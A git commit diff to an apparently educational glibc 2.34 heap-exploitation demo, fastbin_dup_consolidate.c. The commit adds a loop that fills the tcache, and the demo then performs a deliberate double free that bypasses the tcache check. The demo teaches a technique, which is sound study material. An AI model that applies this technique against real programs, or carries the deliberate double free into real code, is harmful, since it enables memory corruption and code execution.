6b1f1d1609132fd99a0a1020a37ffcb31313f3c9
Kyle ZENG <jkjh1jkjh1@gmail.com>
2022-04-14 12:21:23 -0700

    add fastbin_dup_consolidate to every version

--- glibc_2.34/fastbin_dup_consolidate.c
+++ glibc_2.34/fastbin_dup_consolidate.c
@@ -7,13 +7,20 @@ void main() {
 	puts("This is a powerful technique that bypasses the double free check in tcachebin.");
 	printf("Fill up the tcache list to force the fastbin usage...\n");
 
+	void *ptr[7];
+
+	for(int i = 0; i < 7; i++)
+		ptr[i] = malloc(0x40);
+	for(int i = 0; i < 7; i++)
+		free(ptr[i]);
+
 	void* p1 = calloc(1,0x40);
 
 	printf("Allocate another chunk of the same size p1=%p \n", p1);
-	printf("Freeing p1 will add this chunk to the fastbin list...\n\n");
-	free(p1);
+  	printf("Freeing p1 will add this chunk to the fastbin list...\n\n");
+  	free(p1);
 
-	void* p3 = malloc(0x400);
+  	void* p3 = malloc(0x400);
 	printf("Allocating a tcache-sized chunk (p3=%p)\n", p3);
 	printf("will trigger the malloc_consolidate and merge\n");
 	printf("the fastbin chunks into the top chunk, thus\n");
@@ -21,7 +28,7 @@ void main() {
 
 	assert(p1 == p3);
 
-	printf("Triggering the double free vulnerability!\n\n");
+  	printf("Triggering the double free vulnerability!\n\n");
 	free(p1);
 
 	void *p4 = malloc(0x400);
